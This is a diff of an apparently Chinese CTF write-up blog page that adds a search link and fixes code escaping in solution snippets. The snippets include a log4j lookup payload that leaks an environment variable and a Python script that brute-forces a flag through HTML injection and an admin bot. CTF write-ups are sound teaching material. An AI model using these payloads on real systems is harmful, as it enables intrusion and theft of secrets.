@@ -107,6 +107,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -526,7 +528,7 @@ p<span class="token punctuation">.</span>send<span class="token punctuation">(</
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="MyLinuxBot"><a href="#MyLinuxBot" class="headerlink" title="MyLinuxBot"></a>MyLinuxBot</h3><p>提示经典Java漏洞，log4j-jndi</p>
-<pre class=" language-bash"><code class="language-bash">$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;java:$&amp;#123;env:FLAG&amp;#125;&amp;#125;</span>
+<pre class=" language-bash"><code class="language-bash"><span class="token variable">${java:${env:FLAG}</span><span class="token punctuation">}</span>
 </code></pre>
 <h3 id="AirticleShare"><a href="#AirticleShare" class="headerlink" title="AirticleShare"></a>AirticleShare</h3><p>侧信道攻击，由于延时时间长，所以sleep要设置长一点</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -546,18 +548,18 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
 
 <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">for</span> j <span class="token keyword">in</span> ss<span class="token punctuation">:</span>
-        payload <span class="token operator">=</span> f"<span class="token operator">&lt;</span>form data<span class="token operator">-</span>parsley<span class="token operator">-</span>validate<span class="token operator">></span><span class="token operator">&lt;</span>input data<span class="token operator">-</span>parsley<span class="token operator">-</span>required data<span class="token operator">-</span>parsley<span class="token operator">-</span>trigger<span class="token operator">=</span>\"blur\" data<span class="token operator">-</span>parsley<span class="token operator">-</span>error<span class="token operator">-</span>message<span class="token operator">=</span><span class="token string">'&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\">'</span> data<span class="token operator">-</span>parsley<span class="token operator">-</span>errors<span class="token operator">-</span>container<span class="token operator">=</span>\<span class="token string">"a[href^='/lookup.php?id=&amp;#123;flag + j&amp;#125;']\" autofocus>&lt;/form>"</span>
-        data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'c': csrftoken, 'content': payload&amp;#125;</span>
+        payload <span class="token operator">=</span> f<span class="token string">"&lt;form data-parsley-validate>&lt;input data-parsley-required data-parsley-trigger=\"blur\" data-parsley-error-message='&lt;input type=\"input\" id=like value=\"rebirth_is_really_nb\">' data-parsley-errors-container=\"a[href^='/lookup.php?id={flag + j}']\" autofocus>&lt;/form>"</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span> csrftoken<span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
         res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">"add.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
         <span class="token comment" spellcheck="true"># print(res.headers)</span>
         location <span class="token operator">=</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span>
         pos <span class="token operator">=</span> location<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'id='</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span>
         wp <span class="token operator">=</span> location<span class="token punctuation">[</span>pos<span class="token punctuation">:</span><span class="token punctuation">]</span>
-        data <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;'c': csrftoken, 'id': wp&amp;#125;</span>
+        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'c'</span><span class="token punctuation">:</span> csrftoken<span class="token punctuation">,</span> <span class="token string">'id'</span><span class="token punctuation">:</span> wp<span class="token punctuation">}</span>
         res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url <span class="token operator">+</span> <span class="token string">"admin.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
         time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>
 
-        res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">"http://112.74.185.213:46791/lookup.php?id=&amp;#123;wp&amp;#125;"</span><span class="token punctuation">)</span>
+        res <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">"http://112.74.185.213:46791/lookup.php?id={wp}"</span><span class="token punctuation">)</span>
         <span class="token comment" spellcheck="true"># print(res.text)</span>
         txt <span class="token operator">=</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span> <span class="token string">"Liked by&lt;/h3>admin"</span> <span class="token operator">not</span> <span class="token keyword">in</span> txt<span class="token punctuation">:</span>
@@ -709,6 +711,8 @@ print(long_to_bytes(m))
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
         
+          <li><a href="/search/">搜索</a></li>
+        
       </ul>
     </div>
 
@@ -770,6 +774,8 @@ print(long_to_bytes(m))
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
